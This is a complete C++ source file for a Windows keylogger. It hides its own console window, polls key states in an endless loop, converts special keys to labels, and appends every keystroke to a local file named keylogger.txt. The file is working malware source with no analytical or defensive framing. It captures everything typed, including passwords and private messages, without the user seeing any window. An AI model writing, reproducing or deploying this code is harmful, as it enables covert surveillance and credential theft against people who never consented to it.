#include <iostream>
#include <windows.h>
#include <fstream>
#include <bits/stdc++.h>

//Log file

#define LOG_FILE "keylogger.txt"

//save data into log file
void saveData(std::string data){
    std::fstream logfile;

    //std::ios::app will make the new data append to the file instead of erase file content
    logfile.open(LOG_FILE, std::ios::app);

    //write data into log file
    logfile << data;

    logfile.close();

}

//translate special key int into string
std::string translateSpecialKey(int key){
    std::string result;
    
    switch (key)
    {
    case VK_SPACE:
        result=" ";
        break;
    case VK_RETURN:
        result="\n";
        break;
    case VK_BACK:
        result="\b";
        break;  
    case VK_CAPITAL:
        result="[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result="[SHIFT]";
        break; 
    case VK_TAB:
        result="[TAB]";
        break;  
    case VK_CONTROL:
        result="[CTRL]";
        break;
    case VK_MENU:
        result="[ALT]";
        break; 
    
    default:
        break;
    }

    return result;
}

int main(){

    int specialKeyArray[]={VK_SPACE,VK_RETURN,VK_CAPITAL,VK_CONTROL,VK_MENU,
    VK_TAB,VK_BACK,VK_SHIFT};
    std::string specialKeyChar;
    bool isSpecialKey;

    //Hide terminal window
    HWND hwnd =GetConsoleWindow();
    ShowWindow(hwnd,SW_HIDE);

    while (true){
        for (int key = 8; key <= 190; key++){
            if (GetAsyncKeyState(key)== -32767){
               isSpecialKey =std::find(std::begin(specialKeyArray),std::end(specialKeyArray)
               ,key)!= std::end(specialKeyArray);

               if (isSpecialKey){
                specialKeyChar=translateSpecialKey(key);
                saveData(specialKeyChar);
               }
               else{
                //not special key
                if(GetKeyState(VK_CAPITAL)){
                    //CAPSLOCK ON
                    saveData(std::string(1,(char)key));
                }else{
                    //CAPSLOCK OFF
                    //turn characters to lowercase
                    saveData(std::string(1,(char)std::tolower(key)));
                }
               }
               
            }
            
        }
    }
    
    
    

    return(0);
}